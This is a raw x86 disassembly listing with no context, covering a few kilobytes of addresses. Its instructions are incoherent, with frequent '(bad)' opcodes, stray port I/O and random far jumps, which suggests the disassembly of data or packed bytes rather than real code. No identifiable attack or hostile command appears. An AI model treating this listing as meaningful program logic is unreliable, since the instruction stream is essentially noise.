  4174cf:	sbb    edx,DWORD PTR [esi-0x26]
  4174d2:	stos   DWORD PTR es:[edi],eax
  4174d3:	mov    ?,WORD PTR [esi]
  4174d5:	leave  
  4174d6:	jecxz  0x41746a
  4174d8:	lahf   
  4174d9:	sbb    BYTE PTR [edx+0x11c247de],al
  4174df:	xor    cl,BYTE PTR [ebp+0x35da0c0f]
  4174e5:	in     al,0xa5
  4174e7:	cdq    
  4174e8:	cmp    DWORD PTR [esi-0x27],0xfffffff0
  4174ec:	add    DWORD PTR [esi+eiz*2-0x66c218a9],esp
  4174f3:	sbb    DWORD PTR [edx],ebx
  4174f5:	(bad)  
  4174f6:	lods   al,BYTE PTR ds:[esi]
  4174f7:	jl     0x41750f
  4174f9:	jmp    0xff55:0x78113067
  417500:	xlat   BYTE PTR es:[ebx]
  417502:	std    
  417503:	adc    ecx,0x6b
  417506:	sbb    DWORD PTR [edi-0x5a],ebx
  417509:	in     eax,0xf
  41750b:	fld    TBYTE PTR [eax]
  41750d:	mov    dl,0x65
  41750f:	cld    
  417510:	cmp    ch,BYTE PTR [edx+0x65f1e55c]
  417516:	ss xor al,0xeb
  417519:	add    BYTE PTR [ebx],dl
  41751b:	int3   
  41751c:	lods   eax,DWORD PTR ds:[esi]
  41751d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41751e:	pop    ds
  41751f:	mov    esp,0x8982cdd5
  417524:	and    DWORD PTR ds:0x1bbec041,esp
  41752a:	hlt    
  41752b:	retf   0xff44
  41752e:	enter  0xe2cf,0x7b
  417532:	jmp    0x4174fd
  417534:	mov    esp,0x53014a02
  417539:	push   ebp
  41753a:	aad    0x7f
  41753c:	jge    0x4174f2
  41753e:	pop    edx
  41753f:	mov    esi,0xff98d083
  417544:	out    0x10,al
  417546:	test   BYTE PTR [edi],cl
  417548:	push   edi
  417549:	mov    ah,0x5b
  41754b:	inc    ecx
  41754c:	push   ebp
  41754d:	out    dx,al
  41754e:	jnp    0x417533
  417550:	mov    ecx,0x11a9e43a
  417555:	popa   
  417556:	into   
  417557:	mov    DWORD PTR [esi],edx
  417559:	mov    ch,0x21
  41755b:	mov    eax,0xbb9533
  417560:	xor    dh,BYTE PTR [edx+0x35978a74]
  417566:	mov    bh,0xc3
  417568:	jae    0x417516
  41756a:	cs imul ecx,esp,0x1f
  41756e:	das    
  41756f:	mov    eax,ds:0x5622b0a5
  417574:	mov    WORD PTR [ebx+0x4],ss
  417577:	sub    al,0x9e
  417579:	retf   
  41757a:	pop    esp
  41757b:	cld    
  41757c:	pop    ebp
  41757d:	in     eax,dx
  41757e:	push   eax
  41757f:	ret    
  417580:	loopne 0x41754c
  417582:	outs   dx,DWORD PTR ds:[esi]
  417583:	scas   al,BYTE PTR es:[edi]
  417584:	xchg   ebp,eax
  417586:	or     bl,BYTE PTR [esp+esi*8]
  417589:	pop    eax
  41758a:	sbb    ah,ah
  41758c:	jns    0x4175f2
  41758e:	rol    esp,0xf7
  417591:	pop    esi
  417592:	test   BYTE PTR ds:0x251e9bef,0x10
  417599:	adc    al,0xc3
  41759b:	sbb    DWORD PTR [edi-0x4d542b57],ebp
  4175a1:	jae    0x417551
  4175a3:	adc    ah,BYTE PTR [edx-0x5f]
  4175a6:	xchg   esi,eax
  4175a7:	jmp    0xe17f730
  4175ac:	pop    es
  4175ad:	dec    ecx
  4175ae:	mov    dh,0xd1
  4175b0:	in     eax,0x36
  4175b2:	sti    
  4175b3:	mov    esi,0x962270da
  4175b8:	push   es
  4175b9:	push   cs
  4175ba:	call   0x33fd:0x77dfa702
  4175c1:	adc    esi,DWORD PTR [ebp+0xf]
  4175c4:	dec    ebx
  4175c5:	pusha  
  4175c6:	out    0xbf,eax
  4175c8:	mov    dl,0x28
  4175ca:	addr16 aas 
  4175cc:	jae    0x4175f4
  4175ce:	dec    esi
  4175cf:	int3   
  4175d0:	add    BYTE PTR [ebp+0x5a],ah
  4175d3:	push   ebx
  4175d4:	stos   BYTE PTR es:[edi],al
  4175d5:	(bad)  
  4175d6:	dec    esp
  4175d7:	push   ebx
  4175d8:	pop    ss
  4175d9:	aam    0x8d
  4175db:	sahf   
  4175dc:	ret    
  4175dd:	pop    esp
  4175de:	lahf   
  4175df:	out    0x81,eax
  4175e1:	adc    BYTE PTR [ebx-0x5e42510b],al
  4175e7:	push   cs
  4175e8:	push   esi
  4175e9:	fld    TBYTE PTR [esi-0x23b030be]
  4175ef:	and    esp,edi
  4175f1:	clc    
  4175f2:	xor    al,0xde
  4175f4:	push   eax
  4175f5:	ret    0xaa89
  4175f8:	mov    bl,0x10
  4175fa:	pusha  
  4175fb:	jo     0x4175a8
  4175fd:	in     eax,dx
  4175fe:	mov    gs,WORD PTR [ebp+0x7a]
  417601:	scas   al,BYTE PTR es:[edi]
  417602:	sub    dh,BYTE PTR [ebp-0x44]
  417605:	sti    
  417606:	scas   al,BYTE PTR es:[edi]
  417607:	sub    BYTE PTR [edi+0x16f9f821],dh
  41760d:	(bad)  
  41760e:	ja     0x417673
  417610:	adc    bh,dl
  417612:	ins    DWORD PTR es:[edi],dx
  417613:	push   edi
  417614:	push   edi
  417615:	push   ebp
  417616:	(bad)  
  417617:	inc    esi
  417618:	popa   
  417619:	xchg   BYTE PTR [ecx-0x38],al
  41761c:	in     al,0x73
  41761e:	sub    DWORD PTR [esi+0x265cf33],edx
  417624:	imul   ebp,DWORD PTR [ebx+0x6cb0f762],0x16178237
  41762e:	dec    esi
  41762f:	mov    ds:0xa3cec4c4,eax
  417634:	dec    eax
  417635:	dec    esi
  417636:	xchg   esp,eax
  417637:	into   
  417638:	sar    DWORD PTR [ebx+edx*4],cl
  41763b:	push   edx
  41763c:	xor    DWORD PTR [edi+0x718dd71a],0xbf6c114f
  417646:	fsubr  QWORD PTR [edx+0x7d]
  417649:	xchg   edx,eax
  41764a:	add    bl,BYTE PTR [ecx]
  41764c:	shl    DWORD PTR [edx-0x4b],cl
  41764f:	fwait
  417650:	adc    ebp,ebp
  417652:	jecxz  0x4175e5
  417654:	test   BYTE PTR [ecx+0x73],0xc1
  417658:	nop
  417659:	fsubr  DWORD PTR [edx]
  41765c:	scas   al,BYTE PTR es:[edi]
  41765d:	xchg   esp,eax
  41765e:	cmp    eax,0x541548fc
  417663:	js     0x4175f9
  417665:	adc    DWORD PTR [edx],eax
  417667:	jb     0x41768a
  417669:	add    eax,0xc83f56df
  41766e:	(bad)  
  41766f:	outs   dx,BYTE PTR ds:[si]
  417671:	mov    bh,0xe7
  417673:	out    0x42,eax
  417675:	dec    esi
  417676:	in     al,dx
  417677:	cmp    eax,0xfe8eecd1
  41767c:	lock js 0x4176c7
  41767f:	mov    ds:0x13906b4,al
  417684:	and    dh,BYTE PTR [esi-0x3]
  417687:	mov    eax,ds:0x7908c7a0
  41768c:	in     eax,0x93
  41768e:	inc    eax
  41768f:	test   eax,0x18145a07
  417694:	jo     0x4176a3
  417696:	jae    0x417634
  417698:	je     0x4176e1
  41769a:	shl    BYTE PTR [ebp+0x2],1
  41769d:	and    eax,0xee08b66f
  4176a2:	data16 mov ch,BYTE PTR [esi-0x1a88ecbb]
  4176a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176aa:	mov    dl,0x22
  4176ac:	enter  0xf874,0x1f
  4176b0:	mov    dh,0x24
  4176b2:	(bad)  
  4176b3:	sub    DWORD PTR cs:[edi-0x31823933],eax
  4176ba:	or     al,0x77
  4176bc:	mov    BYTE PTR [ebp-0x5941d207],ah
  4176c2:	xchg   ecx,eax
  4176c3:	jp     0x4176bd
  4176c5:	push   eax
  4176c6:	pop    esi
  4176c7:	mov    ds,edx
  4176c9:	xchg   edi,eax
  4176ca:	dec    esp
  4176cb:	stos   BYTE PTR es:[edi],al
  4176cc:	pop    ecx
  4176cd:	dec    esp
  4176ce:	mov    ds:0xe3cb5287,al
  4176d3:	rcl    DWORD PTR [edx+0x238bd64],cl
  4176d9:	sub    DWORD PTR [eax+eax*2],0xffffff89
  4176dd:	cmc    
  4176de:	mov    al,ds:0x31c76d6f
  4176e3:	ror    DWORD PTR [eax+0x2d3e5a3c],cl
  4176e9:	mov    eax,ss
  4176eb:	in     eax,dx
  4176ec:	pop    esi
  4176ed:	popa   
  4176ee:	rol    ecx,0x88
  4176f1:	loopne 0x417683
  4176f3:	in     al,dx
  4176f4:	fnstcw WORD PTR [ebx-0x748740b5]
  4176fa:	add    DWORD PTR [eax],ecx
  4176fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176fd:	in     al,0x90
  4176ff:	and    BYTE PTR [ecx+0x251f707b],0xbe
  417706:	ss pop ebx
  417708:	xor    BYTE PTR [ebp-0x1ed3ef9b],0x90
  41770f:	lds    edx,FWORD PTR [edi+0x64]
  417712:	pop    edx
  417713:	push   esi
  417714:	dec    ebx
  417715:	das    
  417716:	adc    ebp,DWORD PTR [edx]
  417718:	daa    
  417719:	es dec edx
  41771b:	cmc    
  41771c:	mov    al,ds:0x80e4ab28
  417721:	adc    eax,0x39273d5a
  417726:	test   BYTE PTR [esi-0x37b22695],0x7d
  41772d:	cli    
  41772e:	push   ebx
  41772f:	call   0x7d66769
  417734:	xor    dl,BYTE PTR [eax-0x322db2ec]
  41773a:	push   edi
  41773b:	push   es
  41773c:	push   ss
  41773d:	pop    esp
  41773e:	bswap  eax
  417740:	gs lahf 
  417742:	xchg   BYTE PTR [eax+0x63ad0971],bh
  417748:	ja     0x4176d3
  41774a:	loop   0x41777d
  41774c:	in     eax,0x50
  41774e:	ss sbb al,0xbf
  417751:	mov    eax,ds:0x3e9d2f77
  417756:	in     eax,0xc7
  417758:	jp     0x417752
  41775a:	xchg   esp,eax
  41775b:	and    BYTE PTR [eax],al
  41775d:	mov    al,0x7c
  41775f:	fst    QWORD PTR [edx]
  417761:	in     al,0x99
  417763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417764:	call   0x8dc4:0x396d8c65
  41776b:	fistp  QWORD PTR [eax]
  41776d:	hlt    
  41776e:	(bad)  [esi]
  417770:	cmp    eax,0xcd9b45fb
  417775:	mov    ah,0xd3
  417777:	aaa    
  417778:	mov    WORD PTR [ebx+0x45],ss
  41777b:	pop    esp
  41777c:	ror    ebx,1
  41777e:	lea    esp,ds:0x302d7e70
  417784:	fiadd  WORD PTR ds:0x1b44d594
  41778a:	pop    es
  41778b:	or     al,0xd5
  41778d:	xor    al,0xd2
  41778f:	loopne 0x41771c
  417791:	push   ecx
  417792:	xor    BYTE PTR [edx],bl
  417794:	fs push ss
  417796:	pop    eax
  417797:	push   0x41
  417799:	out    0xe3,al
  41779b:	daa    
  41779c:	mov    eax,ds:0x3fec30b3
  4177a1:	cmp    eax,0xbad1aa96
  4177a6:	push   ebp
  4177a7:	or     ch,ch
  4177a9:	jnp    0x41781a
  4177ab:	popf   
  4177ac:	mov    esp,0x5b433c8b
  4177b1:	xchg   edx,eax
  4177b2:	fisttp QWORD PTR [ebx+0x71]
  4177b5:	mov    ds:0xf5e645f2,eax
  4177ba:	jl     0x417774
  4177bc:	dec    edx
  4177bd:	xor    bl,BYTE PTR [edx+ebx*8+0x1e4ec96]
  4177c4:	int3   
  4177c5:	mov    esi,0xd85caf16
  4177ca:	or     ecx,DWORD PTR [eax]
  4177cc:	jp     0x4177dc
  4177ce:	dec    DWORD PTR [esi+0xf]
  4177d1:	push   ss
  4177d2:	pushf  
  4177d3:	stos   DWORD PTR es:[edi],eax
  4177d4:	(bad)  
  4177d5:	(bad)  
  4177d6:	or     ax,0x5b94
  4177da:	outs   dx,BYTE PTR ds:[esi]
  4177db:	mov    esi,0x34a7f69e
  4177e0:	push   ebx
  4177e1:	nop
  4177e2:	bound  eax,QWORD PTR ds:0xb7fc2a31
  4177e8:	fldcw  WORD PTR [edi]
  4177ea:	jmp    0x1d81827d
  4177ef:	dec    edx
  4177f0:	jmp    0x2bdb9506
  4177f5:	imul   ebx,DWORD PTR [ecx-0x4b],0xffffff9f
  4177f9:	jnp    0x4177d6
  4177fb:	imul   ecx,DWORD PTR [ecx-0x18],0x44
  4177ff:	inc    esi
  417800:	inc    edi
  417801:	sbb    al,0x43
  417803:	inc    esp
  417804:	imul   edi,DWORD PTR [eax+0x6b],0x3f9f346e
  41780b:	bound  esp,QWORD PTR [ecx+0x2ddbcba2]
  417811:	mov    bh,0xd1
  417813:	push   es
  417814:	ds add bh,dh
  417817:	inc    esp
  417818:	mov    ebp,0xefb14dd4
  41781d:	test   al,0x4d
  41781f:	or     al,0xf2
  417821:	mov    esi,0xb714e0c7
  417826:	push   ebp
  417827:	aad    0x4f
  417829:	stos   BYTE PTR es:[edi],al
  41782a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41782b:	(bad)  
  41782c:	sbb    BYTE PTR [edi+edx*4-0x50],ch
  417830:	jo     0x4177ec
  417832:	repnz mov eax,ds:0xcf37b073
  417838:	dec    edi
  417839:	jecxz  0x4177ed
  41783b:	push   ecx
  41783c:	cld    
  41783d:	push   esp
  41783e:	xchg   esi,eax
  41783f:	jge    0x417858
  417841:	in     eax,dx
  417842:	push   esi
  417843:	jge    0x4177d3
  417845:	add    DWORD PTR [eax+0x2e93377e],esi
  41784b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41784c:	in     al,0xc6
  41784e:	pop    edi
  41784f:	pop    esi
  417850:	push   es
  417851:	dec    ebp
  417852:	pop    eax
  417853:	idiv   DWORD PTR [esi]
  417855:	or     eax,0x10f6496
  41785a:	mov    eax,ds:0x4b490bdc
  41785f:	addr16 inc edx
  417861:	mov    ds:0x818bed3f,eax
  417866:	xchg   ecx,eax
  417867:	sub    eax,0x9be769c9
  41786c:	xor    DWORD PTR [edx-0x10],esp
  41786f:	jge    0x4178e4
  417871:	(bad)  
  417872:	or     ch,BYTE PTR es:[edx-0x28905c6f]
  417879:	out    0xaf,eax
  41787b:	pop    ss
  41787c:	mov    ebx,ebx
  41787e:	fisttp QWORD PTR ds:0x1d4ce06a
  417884:	fcomp  DWORD PTR [eiz*1+0x26876dd4]
  41788b:	mov    edx,0xe52a5dc7
  417890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417891:	mov    al,ds:0xd9fef331
  417896:	ss push ss
  417898:	sbb    DWORD PTR [ebp+0x349f2b20],eax
  41789e:	cwde   
  41789f:	jg     0x4178a9
  4178a1:	adc    eax,0x6921f397
  4178a6:	mov    eax,0x356feb1c
  4178ab:	jno    0x417901
  4178ad:	sub    cl,BYTE PTR [ebp+0x33]
  4178b0:	ins    DWORD PTR es:[edi],dx
  4178b1:	pop    edi
  4178b2:	push   edx
  4178b3:	jmp    0xad4c:0x3380cb43
  4178ba:	mov    eax,ds
  4178bc:	mov    ah,0x95
  4178be:	mov    esi,0xac3cf596
  4178c3:	pop    eax
  4178c4:	jecxz  0x41785b
  4178c6:	xor    al,0x44
  4178c8:	aad    0x61
  4178ca:	sub    esi,0xffffffd2
  4178cd:	mov    cl,0x9f
  4178cf:	int    0x7a
  4178d1:	xchg   ecx,eax
  4178d2:	div    BYTE PTR [esi-0x4e]
  4178d5:	fidiv  DWORD PTR [edi-0x57891639]
  4178db:	mov    ah,0xc
  4178dd:	fidivr WORD PTR [ebx+0x6f]
  4178e0:	push   edx
  4178e1:	pusha  
  4178e2:	mov    al,ds:0x47d54f3e
  4178e7:	nop
  4178e8:	sbb    eax,0x50e85f02
  4178ed:	lock call 0xb88b:0x22d3e218
  4178f5:	fadd   DWORD PTR ds:0x8fc3c369
  4178fb:	nop
  4178fc:	sbb    ah,BYTE PTR [edi]
  4178fe:	fsub   QWORD PTR [edi-0x55]
  417901:	jns    0x4178c0
  417903:	test   al,0x22
  417905:	dec    edx
  417906:	adc    BYTE PTR [eax-0x1b66ca],ch
  41790c:	in     eax,0x4e
  41790e:	(bad)  
  41790f:	out    dx,al
  417910:	mov    dl,0x8
  417912:	jge    0x41795f
  417914:	out    0xfa,eax
  417916:	inc    ebx
  417917:	iretw  
  417919:	jl     0x41798a
  41791b:	fstp   st(5)
  41791d:	mov    bl,0xea
  41791f:	push   0x5f1714c1
  417924:	xchg   ecx,eax
  417925:	mov    ebp,0x6479aab0
  41792a:	mov    es,WORD PTR [ecx+0x45c79496]
  417930:	or     al,0x5e
  417932:	int    0x93
  417934:	das    
  417935:	dec    esi
  417936:	adc    BYTE PTR [ecx-0x2f],0xca
  41793a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41793b:	stos   BYTE PTR es:[edi],al
  41793c:	aad    0xbf
  41793e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417940:	sbb    bh,BYTE PTR [ebp+esi*2-0x737009cb]
  417947:	fild   WORD PTR [ecx+0x6c]
  41794a:	pop    ebx
  41794b:	push   ss
  41794c:	xor    BYTE PTR [esi],dl
  41794e:	ins    BYTE PTR es:[edi],dx
  41794f:	mov    cl,0x32
  417951:	int3   
  417952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417953:	leave  
  417954:	adc    dh,BYTE PTR [ebp-0x30fd9cfb]
  41795a:	shl    DWORD PTR [ebx+0x66a5aa28],0xe8
  417961:	(bad)  
  417962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417963:	inc    ebp
  417964:	inc    esi
  417965:	dec    ebp
  417966:	inc    esp
  417967:	in     al,0xd6
  417969:	mov    eax,ds:0xc0a97135
  41796e:	inc    esp
  41796f:	data16 cmp dh,bh
  417972:	or     dh,dl
  417974:	xchg   esi,eax
  417975:	adc    al,0x74
  417977:	aam    0x53
  417979:	lock imul ebp,edi,0xba58a90e
  417980:	dec    ebx
  417981:	sub    esp,DWORD PTR [esi]
  417983:	daa    
  417984:	(bad)  
  417985:	lods   al,BYTE PTR ds:[esi]
  417986:	and    eax,0xcd989da3
  41798b:	push   es
  41798c:	jae    0x417989
  41798e:	push   ebp
  41798f:	aam    0x2a
  417991:	xor    ebx,DWORD PTR [ebx-0x1a]
  417994:	xchg   ecx,eax
  417995:	popf   
  417996:	inc    eax
  417997:	pop    es
  417998:	mov    ebp,0xabebd5f
  41799d:	cmp    eax,0x7791e0c7
  4179a2:	rcr    ebx,1
  4179a4:	xchg   edx,eax
  4179a5:	dec    DWORD PTR [ebp-0x8]
  4179a8:	popa   
  4179a9:	dec    esi
  4179aa:	jnp    0x417990
  4179ac:	xchg   edi,eax
  4179ad:	jle    0x4179ea
  4179af:	ins    BYTE PTR es:[edi],dx
  4179b0:	test   dl,ch
  4179b2:	xlat   BYTE PTR ds:[ebx]
  4179b3:	stos   BYTE PTR es:[edi],al
  4179b4:	or     ah,ah
  4179b6:	push   ecx
  4179b7:	clc    
  4179b8:	lds    edx,FWORD PTR [ecx]
  4179ba:	scas   al,BYTE PTR es:[edi]
  4179bb:	fmul   st,st(6)
  4179bd:	pushw  ss
  4179bf:	leave  
  4179c0:	xchg   edi,eax
  4179c1:	add    eax,0xbe2c1467
  4179c6:	inc    ebx
  4179c7:	inc    ecx
  4179c8:	pop    esi
  4179c9:	and    eax,0xbe297d1b
  4179ce:	jmp    0x226c:0x59da0f4a
  4179d5:	mov    esp,ebp
  4179d7:	out    0x41,eax
  4179d9:	(bad)  
  4179da:	adc    edx,DWORD PTR [ebx-0x5f]
  4179dd:	mov    bl,0x2d
  4179df:	scas   eax,DWORD PTR es:[edi]
  4179e0:	es cli 
  4179e2:	fild   DWORD PTR ds:0xe6665890
  4179e8:	lahf   
  4179e9:	and    al,0x45
  4179eb:	aam    0xef
  4179ed:	in     al,dx
  4179ee:	xchg   ebx,eax
  4179ef:	shl    BYTE PTR [ebp+0xc0fe127],0x71
  4179f6:	and    eax,0xf0cecf70
  4179fb:	push   ss
  4179fc:	loope  0x417a03
  4179fe:	mov    ss,WORD PTR [edi+eiz*4-0x27fcba46]
  417a05:	mov    bl,0x94
  417a07:	sbb    BYTE PTR [esi+ebx*1+0x4],ah
  417a0b:	cdq    
  417a0c:	cli    
  417a0d:	outs   dx,DWORD PTR ds:[esi]
  417a0e:	(bad)  
  417a0f:	fnsave [edx-0x63]
  417a12:	dec    eax
  417a13:	jmp    0x60df:0x90bd5c6f
  417a1a:	push   esp
  417a1b:	in     al,dx
  417a1c:	clc    
  417a1d:	sub    bl,ah
  417a1f:	pop    edi
  417a20:	fnstcw WORD PTR [ebx]
  417a22:	sub    al,0x7
  417a24:	mov    al,ds:0x57b33b97
  417a29:	mov    ch,0xcf
  417a2b:	xor    eax,0xcc3ec7dc
  417a30:	adc    DWORD PTR es:[edx+0x778e811a],esi
  417a37:	call   0x9ce46bfe
  417a3c:	pop    ecx
  417a3d:	or     BYTE PTR [ebx-0x7d],bl
  417a40:	aam    0x3d
  417a42:	mov    edi,0x11f41f44
  417a47:	jnp    0x417a9d
  417a49:	sub    bh,bh
  417a4b:	arpl   WORD PTR [eax],di
  417a4d:	cli    
  417a4e:	int    0xd9
  417a50:	ror    BYTE PTR [edi+0xc725f4b],1
  417a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a57:	mov    ch,0xab
  417a59:	cli    
  417a5a:	xor    edi,DWORD PTR [eax-0x7083fb9d]
  417a60:	push   es
  417a61:	int3   
  417a62:	adc    BYTE PTR [ebx-0x17],dh
  417a65:	xor    ebx,DWORD PTR [ebp+0x29]
  417a68:	retf   0xe637
  417a6b:	je     0x417ac8
  417a6d:	jb     0x417a2d
  417a6f:	mov    ?,WORD PTR [esi]
  417a71:	mov    eax,ds:0x373790f3
  417a76:	pop    ebp
  417a77:	mov    al,ds:0x6b8841a
  417a7c:	rol    cl,0x63
  417a7f:	sbb    al,0x50
  417a81:	push   ecx
  417a82:	xor    BYTE PTR [edx-0x14],ch
  417a85:	cmp    DWORD PTR [ebp+0x23],ecx
  417a88:	fild   WORD PTR [edi]
  417a8a:	out    dx,eax
  417a8b:	into   
  417a8c:	cmp    DWORD PTR [ecx],ebx
  417a8e:	jae    0x417a12
  417a90:	cmp    dl,ch
  417a92:	cmp    DWORD PTR [edx+0x896c89f],0xfffffff4
  417a99:	mov    edx,0x2f634c71
  417a9e:	(bad)  
  417a9f:	xlat   BYTE PTR ds:[ebx]
  417aa0:	add    al,0x9f
  417aa2:	xor    BYTE PTR [ebp+0x113f1a51],ch
  417aa8:	or     DWORD PTR [edx],0xffffffa2
  417aab:	cmp    eax,0xe99df72e
  417ab0:	cmp    DWORD PTR [esi-0x5f58edeb],ecx
  417ab6:	adc    al,0xf
  417ab8:	(bad)  
  417ab9:	shl    BYTE PTR [ebx+esi*8-0x7dff68c4],cl
  417ac0:	xchg   BYTE PTR [ebp-0x38b387b5],ch
  417ac6:	cli    
  417ac7:	fs push ds
  417ac9:	ds xchg edx,eax
  417acb:	fld    DWORD PTR [edx-0x76cc4b29]
  417ad1:	in     al,dx
  417ad2:	and    eax,0x3dae1d7d
  417ad7:	fsub   DWORD PTR [ecx]
  417ad9:	adc    DWORD PTR [ecx],edi
  417adb:	sub    BYTE PTR [esi-0x37b760bc],cl
  417ae1:	or     edi,DWORD PTR [edx+edx*8-0x579ee7e9]
  417ae8:	push   eax
  417ae9:	mov    bl,0xea
  417aeb:	cmp    al,0x3
  417aed:	test   eax,0x67ee1f67
  417af2:	or     BYTE PTR [edi-0xf],dh
  417af5:	jl     0x417afe
  417af7:	dec    ebp
  417af8:	or     al,0xdc
  417afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417afb:	xor    bh,cl
  417afd:	sbb    eax,0x439c6507
  417b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b03:	xchg   BYTE PTR [edi-0x1192be6a],dh
  417b09:	mov    ss,WORD PTR [edi]
  417b0b:	xor    eax,0xa588989b
  417b10:	push   es
  417b11:	adc    dh,dl
  417b13:	test   BYTE PTR [ecx+0x26],al
  417b16:	cmp    ebp,ecx
  417b18:	adc    al,0xbc
  417b1a:	leave  
  417b1b:	inc    edi
  417b1c:	mov    ds:0xeef1a1cc,al
  417b21:	pop    esi
  417b22:	inc    ebp
  417b23:	repz sub al,0xf6
  417b26:	push   ss
  417b27:	mov    eax,ds:0xd4021a43
  417b2c:	push   0xfffffff7
  417b2e:	icebp  
  417b2f:	fistp  DWORD PTR [edi]
  417b31:	loop   0x417b42
  417b33:	call   0xf43b:0x9f60a5ec
  417b3a:	jl     0x417b88
  417b3c:	int    0xf1
  417b3e:	dec    esi
  417b3f:	cmp    BYTE PTR [ebx-0x643b65fe],dh
  417b45:	add    eax,0x66fb799a
  417b4a:	xchg   esp,eax
  417b4b:	pop    ecx
  417b4c:	iret   
  417b4d:	jmp    0x10ce:0x342e1cca
  417b54:	(bad)  
  417b55:	mov    eax,ds:0x34e09f3b
  417b5a:	add    al,0xc7
  417b5c:	xor    ah,0x49
  417b5f:	mov    bl,0xf7
  417b61:	pop    edi
  417b62:	not    BYTE PTR [esi]
  417b64:	ret    0x7c54
  417b67:	mov    cl,0x86
  417b69:	sub    bh,BYTE PTR [esi]
  417b6b:	mov    bh,0x32
  417b6d:	in     al,0x40
  417b6f:	dec    edi
  417b70:	lock mov ah,0x6c
  417b73:	jp     0x417ba1
  417b75:	test   DWORD PTR [ebx-0x22baf5fa],ecx
  417b7b:	or     al,0x21
  417b7d:	(bad)  
  417b7f:	aam    0x8a
  417b81:	cmp    eax,0xdd0da3e9
  417b86:	dec    esi
  417b87:	push   ds
  417b88:	pop    ebp
  417b89:	cdq    
  417b8a:	sahf   
  417b8b:	or     ebp,DWORD PTR [ecx-0x16]
  417b8e:	or     ebx,edi
  417b90:	jge    0x417bc5
  417b92:	(bad)  
  417b93:	mov    WORD PTR [ecx-0x141790cf],gs
  417b99:	(bad)  
  417b9a:	fldcw  WORD PTR [ebx-0x25]
  417b9d:	imul   edx,DWORD PTR [edx],0xffffffec
  417ba0:	xor    al,0x41
  417ba2:	dec    ecx
  417ba3:	mov    ebx,0xe6fa613a
  417ba8:	cmp    BYTE PTR [ebx+0x21],0x38
  417bac:	push   ss
  417bad:	sub    dl,BYTE PTR [edx]
  417baf:	js     0x417ba4
  417bb1:	int    0x3d
  417bb3:	jae    0x417bb1
  417bb5:	stc    
  417bb6:	sub    ebx,0x26f7c6cc
  417bbc:	rdtsc  
  417bbe:	jp     0x417c13
  417bc0:	mov    BYTE PTR [ebx+eiz*1+0x42],0xdd
  417bc5:	mov    ebx,0xe2d9f65
  417bca:	ds mov ecx,0x4c87b7c2
  417bd0:	adc    BYTE PTR [ebx+0x4a5302f7],bh
  417bd6:	pop    esp
  417bd7:	fsubr  QWORD PTR [ecx+0x68]
  417bda:	ins    DWORD PTR es:[edi],dx
  417bdb:	push   ds
  417bdc:	loope  0x417ba8
  417bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bdf:	mov    edi,0x31fbfc45
  417be4:	imul   edi,ebp,0x7c
  417be7:	jle    0x417be4
  417be9:	stos   DWORD PTR es:[edi],eax
  417bea:	mov    al,0xdf
  417bec:	sub    eax,0x1e2db070
  417bf1:	or     dh,BYTE PTR [ecx]
  417bf3:	loope  0x417c58
  417bf5:	addr16 pushf 
  417bf7:	or     BYTE PTR [eax+0x5],ch
  417bfa:	push   ds
  417bfb:	jae    0x417bbf
  417bfd:	gs clc 
  417bff:	xlat   BYTE PTR ds:[ebx]
  417c00:	stc    
  417c01:	lods   al,BYTE PTR ds:[esi]
  417c02:	in     eax,dx
  417c03:	mov    eax,ds:0xa485b5cd
  417c08:	out    dx,eax
  417c09:	push   cs
  417c0a:	lods   al,BYTE PTR ds:[esi]
  417c0b:	sbb    ecx,DWORD PTR [esi+0x39]
  417c0e:	xlat   BYTE PTR ds:[ebx]
  417c0f:	sbb    al,0x11
  417c11:	ds ret 0x2707
  417c15:	hlt    
  417c16:	sbb    dl,BYTE PTR [ebx+edi*8]
  417c19:	(bad)  
  417c1b:	not    DWORD PTR ds:0xa26d9f39
  417c21:	xor    DWORD PTR [edx],ebx
  417c23:	call   0x236f:0x6ea5d1e0
  417c2a:	jle    0x417c9d
  417c2c:	in     al,dx
  417c2d:	xor    ch,BYTE PTR [esi]
  417c2f:	mov    bl,0x19
  417c31:	jl     0x417bc8
  417c33:	mov    dl,0x5b
  417c35:	test   eax,0x5cb5fa9b
  417c3a:	adc    edi,DWORD PTR [edi]
  417c3c:	and    BYTE PTR [edx+0x7c4a79c4],bl
  417c42:	mov    al,0xe6
  417c44:	in     eax,dx
  417c45:	call   0xd8a0e4f1
  417c4a:	and    esi,DWORD PTR [esi-0x21ecd24a]
  417c50:	(bad)  
  417c51:	mov    DWORD PTR [ebp-0x7a],0x5607f1b7
  417c58:	into   
  417c59:	inc    esp
  417c5a:	jns    0x417cc5
  417c5c:	xor    al,0x23
  417c5e:	cmp    edi,ecx
  417c60:	dec    ebp
  417c61:	or     BYTE PTR [eax-0x181110fc],0x45
  417c68:	jp     0x417c34
  417c6a:	or     eax,0x670c0998
  417c6f:	popf   
  417c70:	xor    bl,BYTE PTR [edi]
  417c72:	inc    eax
  417c73:	fld    QWORD PTR [ecx]
  417c75:	lds    ebp,FWORD PTR [esi+0x38]
  417c78:	and    bl,0x18
  417c7b:	rcl    BYTE PTR [ebp-0x7e],1
  417c7e:	das    
  417c7f:	cwde   
  417c80:	aaa    
  417c81:	(bad)  
  417c82:	retf   
  417c83:	mov    cl,BYTE PTR [edx+0x2abdd8d0]
  417c89:	in     al,dx
  417c8a:	aam    0xfc
  417c8c:	push   esp
  417c8d:	lahf   
  417c8e:	(bad)  
  417c8f:	push   edx
  417c90:	(bad)  
  417c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c92:	ins    BYTE PTR es:[edi],dx
  417c93:	xor    dl,BYTE PTR [ebx+0x17e29814]
  417c99:	inc    esp
